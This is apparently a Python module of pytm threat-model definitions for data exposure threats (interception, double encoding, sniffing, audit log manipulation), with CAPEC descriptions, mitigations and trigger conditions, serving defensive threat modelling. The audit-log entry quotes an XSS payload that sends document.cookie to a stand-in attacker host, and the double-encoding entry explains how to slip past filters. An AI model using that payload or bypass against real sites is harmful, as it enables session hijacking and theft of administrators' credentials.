"""Data exposure threat definitions."""

from __future__ import annotations

import pytm

from pytm.threat import Threat

class DE01(Threat):
    """Interception."""

    id: str = 'DE01'
    target: tuple = (pytm.Dataflow,)
    description: str = 'Interception'
    details: str = 'An adversary monitors data streams to or from the target for information gathering purposes. This attack may be undertaken to solely gather sensitive information or to support a further attack against the target. This attack pattern can involve sniffing network traffic as well as other types of data streams (e.g. radio). The adversary can attempt to initiate the establishment of a data stream, influence the nature of the data transmitted, or passively observe the communications as they unfold. In all variants of this attack, the adversary is not the intended recipient of the data stream. In contrast to other means of gathering information (e.g., targeting data leaks), the adversary must actively position himself so as to observe explicit data channels (e.g. network traffic) and read the content.'
    likelihood: str = "Medium"
    severity: str = "Medium"
    prerequisites: str = 'The target must transmit data over a medium that is accessible to the adversary.'
    mitigations: str = 'Leverage encryption to encode the transmission of data thus making it accessible only to authorized parties.'
    example: str = 'Adversary tries to block, manipulate, and steal communications in an attempt to achieve a desired negative technical impact.'
    references: str = 'https://capec.mitre.org/data/definitions/117.html, http://cwe.mitre.org/data/definitions/319.html, https://cwe.mitre.org/data/definitions/299.html'

    def _check_condition(self, target) -> bool:
        return not target.controls.isEncrypted or (target.source.inScope and not target.isResponse and (not target.controls.authenticatesDestination or not target.controls.checksDestinationRevocation)) or target.tlsVersion < target.sink.minTLSVersion

class DE02(Threat):
    """Double Encoding."""

    id: str = 'DE02'
    target: tuple = (pytm.Server, pytm.Process)
    description: str = 'Double Encoding'
    details: str = 'The adversary utilizes a repeating of the encoding process for a set of characters (that is, character encoding a character encoding of a character) to obfuscate the payload of a particular request. This may allow the adversary to bypass filters that attempt to detect illegal characters or strings, such as those that might be used in traversal or injection attacks. Filters may be able to catch illegal encoded strings, but may not catch doubly encoded strings. For example, a dot (.), often used in path traversal attacks and therefore often blocked by filters, could be URL encoded as %2E. However, many filters recognize this encoding and would still block the request. In a double encoding, the % in the above URL encoding would be encoded again as %25, resulting in %252E which some filters might not catch, but which could still be interpreted as a dot (.) by interpreters on the target.'
    likelihood: str = "Low"
    severity: str = "Medium"
    prerequisites: str = "The target's filters must fail to detect that a character has been doubly encoded but its interpreting engine must still be able to convert a doubly encoded character to an un-encoded character.The application accepts and decodes URL string request.The application performs insufficient filtering/canonicalization on the URLs."
    mitigations: str = 'Assume all input is malicious. Create a white list that defines all valid input to the software system based on the requirements specifications. Input that does not match against the white list should not be permitted to enter into the system. Test your decoding process against malicious input. Be aware of the threat of alternative method of data encoding and obfuscation technique such as IP address encoding. When client input is required from web-based forms, avoid using the GET method to submit data, as the method causes the form data to be appended to the URL and is easily manipulated. Instead, use the POST method whenever possible. Any security checks should occur after the data has been decoded and validated as correct data format. Do not repeat decoding process, if bad character are left after decoding process, treat the data as suspicious, and fail the validation process.Refer to the RFCs to safely decode URL. Regular expression can be used to match safe URL patterns. However, that may discard valid URL requests if the regular expression is too restrictive. There are tools to scan HTTP requests to the server for valid URL such as URLScan from Microsoft (http://www.microsoft.com/technet/security/tools/urlscan.mspx).'
    example: str = 'Double Enconding Attacks can often be used to bypass Cross Site Scripting (XSS) detection and execute XSS attacks. The use of double encouding prevents the filter from working as intended and allows the XSS to bypass dectection. This can allow an adversary to execute malicious code.'
    references: str = 'https://capec.mitre.org/data/definitions/120.html, http://cwe.mitre.org/data/definitions/173.html, http://cwe.mitre.org/data/definitions/177.html'

    def _check_condition(self, target) -> bool:
        return target.controls.validatesInput is False or target.controls.sanitizesInput is False

class DE03(Threat):
    """Sniffing Attacks."""

    id: str = 'DE03'
    target: tuple = (pytm.Dataflow,)
    description: str = 'Sniffing Attacks'
    details: str = 'In this attack pattern, the adversary intercepts information transmitted between two third parties. The adversary must be able to observe, read, and/or hear the communication traffic, but not necessarily block the communication or change its content. The adversary may precipitate or indirectly influence the content of the observed transaction, but is never the intended recipient of the information. Any transmission medium can theoretically be sniffed if the adversary can examine the contents between the sender and recipient.'
    severity: str = "Medium"
    prerequisites: str = 'The target data stream must be transmitted on a medium to which the adversary has access.'
    mitigations: str = 'Encrypt sensitive information when transmitted on insecure mediums to prevent interception.'
    example: str = 'Attacker knows that the computer/OS/application can request new applications to install, or it periodically checks for an available update. The attacker loads the sniffer set up during Explore phase, and extracts the application code from subsequent communication. The attacker then proceeds to reverse engineer the captured code.'
    references: str = 'https://capec.mitre.org/data/definitions/157.html, http://cwe.mitre.org/data/definitions/311.html'

    def _check_condition(self, target) -> bool:
        return (target.protocol == 'HTTP' or target.controls.isEncrypted is False) or target.usesVPN is False

class DE04(Threat):
    """Audit Log Manipulation."""

    id: str = 'DE04'
    target: tuple = (pytm.Datastore,)
    description: str = 'Audit Log Manipulation'
    details: str = 'The attacker injects, manipulates, deletes, or forges malicious log entries into the log file, in an attempt to mislead an audit of the log file or cover tracks of an attack. Due to either insufficient access controls of the log files or the logging mechanism, the attacker is able to perform such actions.'
    likelihood: str = "High"
    severity: str = "High"
    prerequisites: str = 'The target host is logging the action and data of the user.The target host insufficiently protects access to the logs or logging mechanisms.'
    mitigations: str = 'Use Principle of Least Privilege to avoid unauthorized access to log files leading to manipulation/injection on those files. Do not allow tainted data to be written in the log file without prior input validation. Whitelisting may be used to properly validate the data. Use synchronization to control the flow of execution. Use static analysis tool to identify log forging vulnerabilities. Avoid viewing logs with tools that may interpret control characters in the file, such as command-line shells.'
    example: str = "The attacker alters the log contents either directly through manipulation or forging or indirectly through injection of specially crafted input that the target software will write to the logs. This type of attack typically follows another attack and is used to try to cover the traces of the previous attack. Insert a script into the log file such that if it is viewed using a web browser, the attacker will get a copy of the operator/administrator's cookie and will be able to gain access as that user. For example, a log file entry could contain <script>new Image().src='http://xss.attacker.com/log_cookie?cookie='+encodeURI(document.cookie);</script> The script itself will be invisible to anybody viewing the logs in a web browser (unless they view the source for the page)."
    references: str = 'https://capec.mitre.org/data/definitions/268.html, https://capec.mitre.org/data/definitions/93.html'

    def _check_condition(self, target) -> bool:
        return target.controls.validatesInput is False or target.controls.implementsPOLP is False
